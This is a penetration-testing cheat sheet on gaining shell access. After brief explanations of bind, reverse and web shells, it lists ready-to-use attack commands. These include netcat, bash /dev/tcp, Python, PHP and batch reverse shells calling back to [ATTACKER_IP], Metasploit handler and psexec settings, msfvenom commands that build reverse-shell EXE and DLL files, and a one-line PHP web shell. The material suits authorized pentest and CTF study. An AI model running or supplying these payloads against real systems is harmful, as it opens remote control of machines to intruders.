---
title: 3 – Reverse Shell
summary: Gaining Access step – a note for obtaining a reverse shell on the target.
description: Gaining Access step – a note for obtaining a reverse shell on the target.
---

# Reverse vs Bind vs Web Shell

---

### Bind Shell

**The code is used to start a listener attached to a shell on the target.** 
Then we can connect to the port to obtain remote code execution. 
This has the advantage of not requiring any configuration on our network, but may be prevented by firewalls protecting the target.

### Reverse Shell

**The code makes the target to connects back to the attacker computer.** 
Reverse shells are a good way to bypass firewalls. The drawback is that we need to configure our network to accept the shell: we need to set up an handler.

### Web Shell

**The code allows the attacker to send shell commands to the target server via a web page hosted on this server.**

# Handlers

---

### NETCAT


 > 
 > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
 > Open a listener on delected port.

---

### METASPLOIT


 > 
 > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
 > 
 > **<font color=red>set payload</font> linux/x86/meterpreter/reverse_tcp**</br>
 > Handler for linux (efl) reverse shell.

# Reverse Shell

---

### Ressources

[PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

[Pentestmonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

### NETCAT


 > 
 > **<font color=red>nc -e /bin/bash</font> \[ATTACKER_IP\] \[ATTACKER_PORT\]**</br>
 > Reverse shell. 

---

### BASH


 > 
 > **<font color=red>bash -i >& /dev/tcp/</font>\[ATTACKER_IP\]<font color=red>/</font>\[ATTACKER_PORT\] <font color=red>0>&1</font>**</br>
 > Reverse Shell.

---

### BAT


 > 
 > **<font color=red>@echo off nc.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>-e cmd.exe</font>**</br>
 > Reverse Shell.

---

### PYTHON


 > 
 > **<font color=red>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</font>\[ATTACKER_IP\]<font color=red>",</font>\[ATTACKER_PORT\]<font color=red>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</font>**</br>
 > Reverse Shell.

---

### PHP


 > 
 > **<font color=red>\<?php</font>**</br>
 > **<font color=red>exec("/bin/bash -c 'bash -i > /dev/tcp/</font>\[ATTACKER_IP\]<font color=red>/</font>\[ATTACKER_PORT\] <font color=red>0>&1'");</font>**</br>
 > **<font color=red>?\></font>**</br>
 > Very simple reverse shell.

Fancy reverse shell:
**[Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)**
Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-shell.php</font>

---

### METASPLOIT


 > 
 > **<font color=red>use</font> <font color=lightblue>exploit/windows/smb/psexec</font>**
 > 
 > **<font color=red>set lhost</font> \[ATTACKER_IP\]**</br>
 > **<font color=red>set rhosts</font> \[TARGET_IP\]**</br>
 > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**</br>
 > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
 > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
 > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
 > Create a reverse shell from a SMB share.

---

### MSVENOM (Reverse Shell Generator)


 > 
 > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
 > Generate a Linux reverse shell.


 > 
 > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o</font> shell<font color=red>.exe</font>**</br>
 > Generate a reverse shell exe.

 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o </font>shell<font color=red>.exe</font>**</br>
 > Generate a meterpreter reverse shell exe.

 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> shell<font color=red>.dll</font>**</br>
 > Generate a meterpreter reverse shell DLL.

# Web Shell

---

### PHP


 > 
 > **<font color=red>\<?php</font>**</br>
 > **<font color=red>system($\_GET\["</font>cmd<font color=red>"\]);</font>**</br>
 > **<font color=red>?></font>**</br>
 > Web shell. After upload, go to http://\[TARGET_IP\]/myWebShell.php?cmd=whoami
